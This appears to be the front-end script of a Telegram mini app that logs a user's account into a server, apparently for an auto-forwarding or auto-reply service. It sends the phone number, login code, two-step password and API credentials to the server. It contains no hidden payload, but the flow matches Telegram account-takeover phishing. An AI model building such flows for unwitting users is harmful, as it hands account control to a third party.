document.addEventListener("DOMContentLoaded", () => {
  // Initialize Telegram WebApp
  const tgWebApp = window.Telegram.WebApp
  tgWebApp.expand()
  tgWebApp.ready()

  // Get containers
  const phoneContainer = document.getElementById("phone-container")
  const otpContainer = document.getElementById("otp-container")
  const twofaContainer = document.getElementById("twofa-container")
  const successContainer = document.getElementById("success-container")
  const apiSetupPopup = document.getElementById("api-setup-popup")

  // Get forms
  const phoneForm = document.getElementById("phone-form")
  const otpForm = document.getElementById("otp-form")
  const twofaForm = document.getElementById("twofa-form")
  const apiSetupForm = document.getElementById("api-setup-form")

  // Get buttons
  const backToPhone = document.getElementById("back-to-phone")
  const backToOtp = document.getElementById("back-to-otp")
  const apiSetupBtn = document.getElementById("api-setup-btn")
  const closeApiPopup = document.getElementById("close-api-popup")
  
  // API Setup popup handlers
  apiSetupBtn.addEventListener("click", () => {
    apiSetupPopup.classList.add("show")
  })
  
  closeApiPopup.addEventListener("click", () => {
    apiSetupPopup.classList.remove("show")
  })
  
  // Close popup when clicking outside
  apiSetupPopup.addEventListener("click", (e) => {
    if (e.target === apiSetupPopup) {
      apiSetupPopup.classList.remove("show")
    }
  })
  
  // Handle API setup form submission
  apiSetupForm.addEventListener("submit", (e) => {
    e.preventDefault()
    
    const apiId = document.getElementById("api-id").value
    const apiHash = document.getElementById("api-hash").value
    const userId = document.getElementById("api-user-id").value
    
    if (!apiId || !apiHash) {
      showError("API ID and API Hash are required")
      return
    }
    
    // Validate API ID is a number
    if (!/^\d+$/.test(apiId)) {
      showError("API ID must be a number")
      return
    }
    
    // Get submit button and add loading state
    const submitButton = apiSetupForm.querySelector("button[type='submit']")
    submitButton.classList.add("loading")
    
    // Send API credentials to server
    fetch("/save-api-credentials", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        api_id: apiId,
        api_hash: apiHash,
        user_id: userId
      }),
    })
      .then((response) => response.json())
      .then((data) => {
        // Remove loading state
        submitButton.classList.remove("loading")
        
        if (data.success) {
          // Show success message
          showSuccess("API credentials saved successfully")
          
          // Close the popup after a delay
          setTimeout(() => {
            apiSetupPopup.classList.remove("show")
          }, 2000)
        } else {
          showError(data.message || "Failed to save API credentials")
        }
      })
      .catch((error) => {
        // Remove loading state
        submitButton.classList.remove("loading")
        
        console.error("Error:", error)
        showError("An error occurred. Please try again.")
      })
  })
  
  // Create error popup element
  const errorPopup = document.createElement("div")
  errorPopup.className = "error-popup"
  errorPopup.innerHTML = `
    <div class="error-popup-icon">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <circle cx="12" cy="12" r="10"></circle>
        <line x1="12" y1="8" x2="12" y2="12"></line>
        <line x1="12" y1="16" x2="12.01" y2="16"></line>
      </svg>
    </div>
    <div class="error-popup-message"></div>
    <div class="error-popup-close">
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <line x1="18" y1="6" x2="6" y2="18"></line>
        <line x1="6" y1="6" x2="18" y2="18"></line>
      </svg>
    </div>
  `
  document.body.appendChild(errorPopup)
  
  // Create success popup element
  const successPopup = document.createElement("div")
  successPopup.className = "error-popup success-popup"
  successPopup.innerHTML = `
    <div class="error-popup-icon">
      <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#4CAF50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
        <polyline points="22 4 12 14.01 9 11.01"></polyline>
      </svg>
    </div>
    <div class="error-popup-message"></div>
    <div class="error-popup-close">
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
        <line x1="18" y1="6" x2="6" y2="18"></line>
        <line x1="6" y1="6" x2="18" y2="18"></line>
      </svg>
    </div>
  `
  document.body.appendChild(successPopup)
  
  // Function to show error popup
  function showError(message) {
    const messageElement = errorPopup.querySelector(".error-popup-message")
    messageElement.textContent = message
    errorPopup.classList.add("show")
    
    // Auto hide after 5 seconds
    setTimeout(() => {
      errorPopup.classList.remove("show")
    }, 5000)
  }
  
  // Function to show success popup
    // Function to show success popup
    function showSuccess(message) {
      const messageElement = successPopup.querySelector(".error-popup-message")
      messageElement.textContent = message
      successPopup.classList.add("show")
      
      // Auto hide after 3 seconds
      setTimeout(() => {
        successPopup.classList.remove("show")
      }, 3000)
    }
    
    // Close error popup when clicking the close button
    errorPopup.querySelector(".error-popup-close").addEventListener("click", () => {
      errorPopup.classList.remove("show")
    })
    
    // Close success popup when clicking the close button
    successPopup.querySelector(".error-popup-close").addEventListener("click", () => {
      successPopup.classList.remove("show")
    })
  
    // Handle phone form submission
    phoneForm.addEventListener("submit", (e) => {
      e.preventDefault()
  
      const phone = document.getElementById("phone").value
      const user_id = document.getElementById("user_id").value
      
      // Validate phone number format
      const phoneRegex = /^\+[1-9]\d{1,14}$/
      if (!phoneRegex.test(phone)) {
        showError("Phone number must be in international format (e.g., +1234567890)")
        return
      }
      
      // Get submit button and add loading state
      const submitButton = phoneForm.querySelector("button[type='submit']")
      submitButton.classList.add("loading")
  
      // Send phone number to server
      fetch("/submit-phone", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
          phone: phone,
          user_id: user_id,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          // Remove loading state
          submitButton.classList.remove("loading")
          
          if (data.success) {
            if (data.already_logged_in) {
              // User is already logged in
              let message = data.message || "You are already logged in";
              
              // Show a custom message based on enabled features
              if (data.forwarding_on || data.auto_reply_status) {
                showFeatureEnabledPopup(message);
              } else {
                // Just show success container
                phoneContainer.classList.remove("active");
                successContainer.classList.add("active");
                startCountdown();
              }
            } else {
            // Store phone for next step
            document.getElementById("stored-phone").value = data.phone
  
            // Show OTP container
            phoneContainer.classList.remove("active")
            otpContainer.classList.add("active")
  
            // Focus on first OTP input
            document.querySelector('.otp-input[data-index="1"]').focus()
            }
          } else {
            showError(data.message || "An error occurred")
          }
        })
        .catch((error) => {
          // Remove loading state
          submitButton.classList.remove("loading")
          
          console.error("Error:", error)
          showError("An error occurred. Please try again.")
        })
    })
  
    function showFeatureEnabledPopup(message) {
      // Create a special popup for feature enabled
      const featurePopup = document.createElement("div");
      featurePopup.className = "feature-popup";
      featurePopup.innerHTML = `
        <div class="feature-popup-content">
          <div class="feature-popup-icon">
            <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="#4CAF50" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path>
              <polyline points="22 4 12 14.01 9 11.01"></polyline>
            </svg>
          </div>
          <h2>Already Active</h2>
          <p>${message}</p>
          <div class="countdown">Closing in <span id="feature-countdown">5</span> seconds</div>
        </div>
      `;
      
      document.body.appendChild(featurePopup);
      
      // Add the show class after a small delay to trigger animation
      setTimeout(() => {
        featurePopup.classList.add("show");
      }, 10);
      
      // Start countdown
      let seconds = 5;
      const countdownElement = featurePopup.querySelector("#feature-countdown");
      
      const interval = setInterval(() => {
        seconds--;
        countdownElement.textContent = seconds;
        
        if (seconds <= 0) {
          clearInterval(interval);
          featurePopup.classList.remove("show");
          
          // Remove from DOM after animation
          setTimeout(() => {
            document.body.removeChild(featurePopup);
            // Close the WebApp
            tgWebApp.close();
          }, 300);
        }
      }, 1000);
    }
    // Handle OTP inputs
    const otpInputs = document.querySelectorAll(".otp-input")
  
    otpInputs.forEach((input) => {
      input.addEventListener("input", function () {
        const index = Number.parseInt(this.getAttribute("data-index"))
  
        // Auto-focus next input
        if (this.value.length === 1 && index < 5) {
          document.querySelector(`.otp-input[data-index="${index + 1}"]`).focus()
        }
  
        // Combine all OTP inputs
        let fullOtp = ""
        otpInputs.forEach((input) => {
          fullOtp += input.value
        })
  
        document.getElementById("full-otp").value = fullOtp
      })
  
      // Handle backspace
      input.addEventListener("keydown", function (e) {
        const index = Number.parseInt(this.getAttribute("data-index"))
  
        if (e.key === "Backspace" && this.value.length === 0 && index > 1) {
          document.querySelector(`.otp-input[data-index="${index - 1}"]`).focus()
        }
      })
    })
  
    // Handle OTP form submission
    otpForm.addEventListener("submit", (e) => {
      e.preventDefault()
  
      const otp = document.getElementById("full-otp").value
      const phone = document.getElementById("stored-phone").value
  
      if (otp.length !== 5) {
        showError("Please enter all 5 digits of the OTP")
        return
      }
      
      // Get submit button and add loading state
      const submitButton = otpForm.querySelector("button[type='submit']")
      submitButton.classList.add("loading")
  
      // Send OTP to server
      fetch("/submit-otp", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
          otp: otp,
          phone: phone,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          // Remove loading state
          submitButton.classList.remove("loading")
          
          if (data.success) {
            if (data.needs_2fa) {
              // Show 2FA container
              otpContainer.classList.remove("active")
              twofaContainer.classList.add("active")
              document.getElementById("password").focus()
            } else {
              // Show success container
              otpContainer.classList.remove("active")
              successContainer.classList.add("active")
              startCountdown()
            }
          } else {
            showError(data.message || "Invalid OTP. Please try again.")
          }
        })
        .catch((error) => {
          // Remove loading state
          submitButton.classList.remove("loading")
          
          console.error("Error:", error)
          showError("An error occurred. Please try again.")
        })
    })
  
    // Handle 2FA form submission
    twofaForm.addEventListener("submit", (e) => {
      e.preventDefault()
  
      const password = document.getElementById("password").value
      
      // Get submit button and add loading state
      const submitButton = twofaForm.querySelector("button[type='submit']")
      submitButton.classList.add("loading")
  
      // Send 2FA password to server
      fetch("/submit-2fa", {
        method: "POST",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
        body: new URLSearchParams({
          password: password,
        }),
      })
        .then((response) => response.json())
        .then((data) => {
          // Remove loading state
          submitButton.classList.remove("loading")
          
          if (data.success) {
            // Show success container
            twofaContainer.classList.remove("active")
            successContainer.classList.add("active")
            startCountdown()
          } else {
            showError(data.message || "Invalid password. Please try again.")
          }
        })
        .catch((error) => {
          // Remove loading state
          submitButton.classList.remove("loading")
          
          console.error("Error:", error)
          showError("An error occurred. Please try again.")
        })
    })
  
    // Handle back buttons
    backToPhone.addEventListener("click", () => {
      otpContainer.classList.remove("active")
      phoneContainer.classList.add("active")
    })
  
    backToOtp.addEventListener("click", () => {
      twofaContainer.classList.remove("active")
      otpContainer.classList.add("active")
    })
  
    // Countdown function
    function startCountdown() {
      let seconds = 5
      const countdownElement = document.getElementById("countdown")
  
      const interval = setInterval(() => {
        seconds--
        countdownElement.textContent = seconds
  
        if (seconds <= 0) {
          clearInterval(interval)
          // Close the WebApp
          tgWebApp.close()
        }
      }, 1000)
    }
  })
  